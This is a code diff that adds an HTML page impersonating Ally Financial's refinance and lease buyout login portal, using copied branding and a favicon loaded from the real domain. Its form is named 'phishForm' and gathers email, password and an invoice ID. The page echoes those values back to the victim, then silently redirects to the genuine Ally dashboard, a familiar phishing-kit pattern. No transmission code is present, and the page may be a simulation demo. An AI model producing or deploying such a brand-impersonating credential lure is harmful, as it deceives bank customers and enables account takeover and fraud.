@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Refinance and Lease Buyout Customer Portal | Ally</title>
+  <!-- Favicon -->
+  <link rel="icon" type="image/x-icon" href="https://myportal.ally.com/assets/ally-favicon.png" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e8e8e8;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      background-color: #4c1053;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+    }
+    /* Inline SVG logo styling */
+    .logo {
+      width: 120px;
+      height: auto;
+      fill: #ffffff;
+    }
+    header .spacer { flex: 1; }
+    header a { color: #fff; text-decoration: none; font-size: 14px; }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+    }
+    .login-box {
+      width: 400px;
+      background: #fff;
+      padding: 30px;
+      border-radius: 4px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      z-index: 1;
+    }
+    h1 { font-size: 20px; margin-bottom: 8px; }
+    p.subtitle { margin-bottom: 24px; font-size: 14px; color: #555; }
+    label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 6px; }
+    input { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 2px; font-size: 14px; }
+    .actions { display: flex; align-items: center; }
+    .actions button {
+      background-color: #0066cc;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 2px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .actions button:hover { background-color: #005bb5; }
+    .actions a { margin-left: 16px; font-size: 12px; color: #0066cc; text-decoration: none; }
+    .actions a:hover { text-decoration: underline; }
+
+    /* Spinner overlay */
+    .overlay {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      visibility: hidden;
+      z-index: 2;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #ccc;
+      border-top-color: #0066cc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .creds-box {
+      background: #fff;
+      padding: 20px;
+      border-radius: 4px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    footer {
+      padding: 20px;
+      background: #e8e8e8;
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    footer .links a { margin-left: 16px; color: #0066cc; text-decoration: none; }
+    footer .links a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <header>
+    <!-- Inline Ally logo SVG -->
+    <svg class="logo" viewBox="0 0 66 37" xmlns="http://www.w3.org/2000/svg" aria-label="Ally logo">
+      <path d="M49.5044795,8.16027704 L53.9552144,20.9693531 L58.1988332,8.16027704 L65,8.16027704 L54.1241488,37 L47.3628779,37 L50.6382411,29.0888362 L42.7030011,8.16027704 L49.5044795,8.16027704 Z M8.54564064,8.11323819 C16.2616088,6.70844194 21.7462096,12.6614661 21.7462096,18.5584102 L21.7462096,18.5584102 L21.7462096,29.0842069 L15.4749108,29.0842069 L15.4749108,23.3391914 C15.496244,21.8109708 15.5053228,21.0151414 15.5081645,20.5580884 L15.5089495,20.4018049 C15.5090355,20.3781481 15.5091001,20.3556224 15.5091448,20.3341318 L15.5090474,20.1660681 C15.5089855,20.1499229 15.5089081,20.1345245 15.5088166,20.1197767 L15.5081104,20.0383295 C15.5078265,20.0132705 15.507498,19.9900454 15.5071367,19.9678855 L15.5059662,19.9038321 C15.5034752,19.7790408 15.500226,19.664917 15.4987571,19.3954047 L15.4980289,19.1615405 L15.4980289,19.1615405 L15.4979756,19.0679459 C15.4979756,15.028011 11.9310293,13.4980057 9.44501356,14.2716301 C5.14466766,15.8201216 5.19547264,20.9526068 8.78065266,22.9009596 C9.47114852,23.2763539 10.1394904,23.3446352 11.942689,23.3493671 L12.3625508,23.3494716 C13.0217754,23.3483561 13.8166179,23.3421842 14.7899306,23.3399767 L15.465716,23.3391914 C14.3048377,24.5931465 10.8123845,28.2944265 9.69654499,29.5056613 C6.89042669,29.357927 2.92343007,27.3828546 1.01668469,23.3593864 C-2.14989966,16.2212257 2.55937962,9.37185361 8.54564064,8.11323819 Z M31.1556513,0 L31.1556513,29.088743 L24.6457561,29.088743 L24.6457561,0 L31.1556513,0 Z M40.8117154,0 L40.8117154,29.088743 L34.304937,29.088743 L34.304937,0 L40.8117154,0 Z" fill="#ffffff"/>
+    </svg>
+    <div class="spacer"></div>
+    <a href="#">Contact Us ▾</a>
+  </header>
+  <main>
+    <div class="login-box">
+      <h1>Refinance and Lease Buyout Customer Portal</h1>
+      <p class="subtitle">Enter your email and password to log in.</p>
+      <form id="phishForm">
+        <label for="email">EMAIL</label>
+        <input type="email" id="email" name="email" required autofocus />
+        <label for="password">PASSWORD</label>
+        <input type="password" id="password" name="password" required />
+        <div class="actions">
+          <button type="submit">Log In</button>
+          <a href="#">Forgot Password?</a>
+        </div>
+      </form>
+    </div>
+
+    <div class="overlay" id="overlay">
+      <div class="spinner"></div>
+      <div class="creds-box" id="credsBox" style="display:none;">
+        <h2>Thanks for your info!</h2>
+        <p id="credsDisplay"></p>
+      </div>
+    </div>
+  </main>
+  <footer>
+    <div>© 2009 – 2025 Ally Financial Inc.</div>
+    <div class="links">
+      <a href="#">About Us</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Privacy Policy</a>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const params = new URLSearchParams(window.location.search);
+      const invoiceId = params.get('invoice_id');
+
+      // Show spinner
+      const overlay = document.getElementById('overlay');
+      overlay.style.visibility = 'visible';
+
+      // After 2s, show credentials box
+      setTimeout(() => {
+        document.querySelector('.spinner').style.display = 'none';
+        const credsBox = document.getElementById('credsBox');
+        credsBox.style.display = 'block';
+        document.getElementById('credsDisplay').innerText =
+          `Invoice: ${invoiceId}\nEmail: ${email}\nPassword: ${password}`;
+
+        // After 3s more, redirect silently
+        setTimeout(() => {
+          window.location.href = 'https://myportal.ally.com/dashboard';
+        }, 3000);
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
